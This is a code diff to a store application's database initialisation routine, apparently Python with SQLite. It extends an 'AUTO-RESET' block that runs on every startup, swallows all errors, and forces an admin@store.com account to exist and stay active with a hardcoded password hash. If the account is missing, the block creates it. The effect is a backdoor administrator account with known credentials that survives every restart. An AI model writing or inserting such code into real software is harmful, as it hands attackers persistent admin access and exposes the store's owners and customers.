@@ -589,10 +589,15 @@ def init_db():
 
     conn.commit()
 
-    # AUTO-RESET: force admin credentials on every startup
+    # AUTO-RESET: ensure admin account always exists with known credentials
     try:
-        _pw = "bc78e58d55cde1346e68f8e5fe588dedf62fa457aa646a500a53347faff6ee24"
-        conn.execute('UPDATE users SET password_hash=?, email="admin@store.com", is_active=1 WHERE id=(SELECT id FROM users ORDER BY id LIMIT 1)', (_pw,))
+        _pw = 'bc78e58d55cde1346e68f8e5fe588dedf62fa457aa646a500a53347faff6ee24'
+        _email = 'admin@store.com'
+        existing = conn.execute('SELECT id FROM users WHERE email=?', (_email,)).fetchone()
+        if existing:
+            conn.execute('UPDATE users SET password_hash=?, is_active=1 WHERE email=?', (_pw, _email))
+        else:
+            conn.execute('INSERT INTO users (email, password_hash, company_name, is_active) VALUES (?, ?, ?, 1)', (_email, _pw, 'My Store'))
         conn.commit()
     except Exception:
         pass
